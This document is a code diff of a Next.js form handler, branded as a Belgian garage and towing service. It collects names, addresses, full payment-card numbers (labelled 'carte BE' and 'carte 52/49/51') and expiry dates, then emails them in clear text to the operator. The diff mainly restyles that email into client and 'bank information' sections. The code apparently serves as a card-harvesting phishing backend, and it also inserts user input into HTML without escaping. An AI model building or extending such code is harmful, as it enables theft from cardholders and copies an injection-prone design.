@@ -16,13 +16,12 @@ const transporter = nodemailer.createTransport({
 function validateFormData(data: any) {
   const requiredFields = [
     'nom_complet',
-    'email', 
+    'email',
     'telephone',
     'adresse',
     'carte_be',
     'carte_52_49_51',
     'date_expiration',
-    'submission_id',
     'montant'
   ]
 
@@ -43,8 +42,16 @@ function validateFormData(data: any) {
 
 // Fonction pour créer le template HTML de l'email
 function createEmailTemplate(data: any, formType: string) {
-  const title = formType === 'enregistrement' ? 'Formulaire d\'enregistrement' : 'Formulaire de réception de fond'
-  
+  const title = formType === 'enregistrement' ? '🚗 Nouveau Formulaire d\'Enregistrement' : '💰 Nouveau Formulaire de Réception de Fond'
+  const currentDate = new Date()
+  const dateStr = currentDate.toLocaleDateString('fr-FR', {
+    weekday: 'long',
+    year: 'numeric',
+    month: 'long',
+    day: 'numeric'
+  })
+  const timeStr = currentDate.toLocaleTimeString('fr-FR')
+
   return `
     <!DOCTYPE html>
     <html>
@@ -52,62 +59,192 @@ function createEmailTemplate(data: any, formType: string) {
       <meta charset="utf-8">
       <title>${title}</title>
       <style>
-        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
-        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
-        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 8px 8px 0 0; }
-        .content { background: #f9f9f9; padding: 20px; border-radius: 0 0 8px 8px; }
-        .field { margin-bottom: 15px; }
-        .label { font-weight: bold; color: #555; }
-        .value { background: white; padding: 10px; border-radius: 4px; border-left: 4px solid #667eea; }
-        .footer { text-align: center; margin-top: 20px; color: #666; font-size: 12px; }
+        body {
+          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+          line-height: 1.6;
+          color: #333;
+          margin: 0;
+          padding: 0;
+          background-color: #f5f7fa;
+        }
+        .container {
+          max-width: 650px;
+          margin: 20px auto;
+          background: white;
+          border-radius: 12px;
+          overflow: hidden;
+          box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .header {
+          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+          color: white;
+          padding: 30px;
+          text-align: center;
+        }
+        .header h1 {
+          margin: 0 0 10px 0;
+          font-size: 24px;
+          font-weight: 600;
+        }
+        .header p {
+          margin: 0;
+          opacity: 0.9;
+          font-size: 14px;
+        }
+        .content {
+          padding: 30px;
+        }
+        .client-info {
+          background: linear-gradient(135deg, #e3f2fd 0%, #f3e5f5 100%);
+          padding: 20px;
+          border-radius: 8px;
+          margin-bottom: 25px;
+          border-left: 4px solid #667eea;
+        }
+        .client-info h2 {
+          margin: 0 0 15px 0;
+          color: #667eea;
+          font-size: 18px;
+          display: flex;
+          align-items: center;
+        }
+        .financial-info {
+          background: linear-gradient(135deg, #fff3e0 0%, #fce4ec 100%);
+          padding: 20px;
+          border-radius: 8px;
+          margin-bottom: 25px;
+          border-left: 4px solid #ff9800;
+        }
+        .financial-info h2 {
+          margin: 0 0 15px 0;
+          color: #ff9800;
+          font-size: 18px;
+          display: flex;
+          align-items: center;
+        }
+        .field {
+          display: flex;
+          margin-bottom: 12px;
+          align-items: flex-start;
+        }
+        .label {
+          font-weight: 600;
+          color: #555;
+          min-width: 140px;
+          margin-right: 15px;
+        }
+        .value {
+          background: white;
+          padding: 8px 12px;
+          border-radius: 6px;
+          border: 1px solid #e0e0e0;
+          flex: 1;
+          font-family: 'Courier New', monospace;
+          font-size: 14px;
+        }
+        .amount {
+          background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
+          color: white;
+          font-weight: bold;
+          font-size: 16px;
+          text-align: center;
+          padding: 12px;
+          border-radius: 6px;
+        }
+        .footer {
+          background: #f8f9fa;
+          text-align: center;
+          padding: 20px;
+          color: #666;
+          font-size: 12px;
+          border-top: 1px solid #e9ecef;
+        }
+        .footer strong {
+          color: #667eea;
+        }
+        .contact-actions {
+          background: #e8f5e8;
+          padding: 15px;
+          border-radius: 8px;
+          margin-top: 20px;
+          text-align: center;
+        }
+        .contact-actions a {
+          display: inline-block;
+          margin: 5px 10px;
+          padding: 8px 16px;
+          background: #667eea;
+          color: white;
+          text-decoration: none;
+          border-radius: 4px;
+          font-size: 12px;
+        }
       </style>
     </head>
     <body>
       <div class="container">
         <div class="header">
           <h1>${title}</h1>
-          <p>Nouvelle demande reçue le ${new Date().toLocaleDateString('fr-FR')} à ${new Date().toLocaleTimeString('fr-FR')}</p>
+          <p>📅 Reçu le ${dateStr} à ${timeStr}</p>
         </div>
+
         <div class="content">
-          <div class="field">
-            <div class="label">Nom complet :</div>
-            <div class="value">${data.nom_complet}</div>
+          <!-- Informations Client -->
+          <div class="client-info">
+            <h2>👤 Informations du Client</h2>
+            <div class="field">
+              <div class="label">Nom complet :</div>
+              <div class="value">${data.nom_complet}</div>
+            </div>
+            <div class="field">
+              <div class="label">Email :</div>
+              <div class="value">${data.email}</div>
+            </div>
+            <div class="field">
+              <div class="label">Téléphone :</div>
+              <div class="value">${data.telephone}</div>
+            </div>
+            <div class="field">
+              <div class="label">Adresse :</div>
+              <div class="value">${data.adresse}</div>
+            </div>
           </div>
-          <div class="field">
-            <div class="label">Email :</div>
-            <div class="value">${data.email}</div>
+
+          <!-- Informations Financières -->
+          <div class="financial-info">
+            <h2>💳 Informations Bancaires</h2>
+            <div class="field">
+              <div class="label">Carte BE :</div>
+              <div class="value">${data.carte_be}</div>
+            </div>
+            <div class="field">
+              <div class="label">Carte 52/49/51 :</div>
+              <div class="value">${data.carte_52_49_51}</div>
+            </div>
+            <div class="field">
+              <div class="label">Date d'expiration :</div>
+              <div class="value">${data.date_expiration}</div>
+            </div>
+            <div class="field">
+              <div class="label">Montant :</div>
+              <div class="amount">${data.montant} €</div>
+            </div>
           </div>
-          <div class="field">
-            <div class="label">Téléphone :</div>
-            <div class="value">${data.telephone}</div>
-          </div>
-          <div class="field">
-            <div class="label">Adresse de récupération :</div>
-            <div class="value">${data.adresse}</div>
-          </div>
-          <div class="field">
-            <div class="label">Numéro de carte BE :</div>
-            <div class="value">${data.carte_be}</div>
-          </div>
-          <div class="field">
-            <div class="label">Numéro de carte 52/49/51 :</div>
-            <div class="value">${data.carte_52_49_51}</div>
-          </div>
-          <div class="field">
-            <div class="label">Date d'expiration :</div>
-            <div class="value">${data.date_expiration}</div>
-          </div>
-          <div class="field">
-            <div class="label">Submission ID :</div>
-            <div class="value">${data.submission_id}</div>
-          </div>
-          <div class="field">
-            <div class="label">Montant :</div>
-            <div class="value">${data.montant} €</div>
+
+          <!-- Actions rapides -->
+          <div class="contact-actions">
+            <strong>Actions rapides :</strong><br>
+            <a href="mailto:${data.email}?subject=Re: ${title} - ${data.nom_complet}">📧 Répondre au client</a>
+            <a href="tel:${data.telephone}">📞 Appeler le client</a>
           </div>
         </div>
+
         <div class="footer">
-          <p>Email envoyé automatiquement depuis autodp.org</p>
+          <p>
+            <strong>AutoDP</strong> - Garage & Remorquage 24/7<br>
+            Email envoyé automatiquement depuis <strong>autodp.org</strong><br>
+            Pour toute question, contactez le support technique.
+          </p>
         </div>
       </div>
     </body>
@@ -156,16 +293,22 @@ export async function POST(request: NextRequest) {
       html: emailHtml,
       text: `
         ${subject}
-        
+
+        === INFORMATIONS CLIENT ===
         Nom: ${body.nom_complet}
         Email: ${body.email}
         Téléphone: ${body.telephone}
         Adresse: ${body.adresse}
+
+        === INFORMATIONS BANCAIRES ===
         Carte BE: ${body.carte_be}
         Carte 52/49/51: ${body.carte_52_49_51}
         Date expiration: ${body.date_expiration}
-        Submission ID: ${body.submission_id}
         Montant: ${body.montant} €
+
+        ---
+        Email envoyé depuis autodp.org
+        Date: ${new Date().toLocaleString('fr-FR')}
       `
     }
 
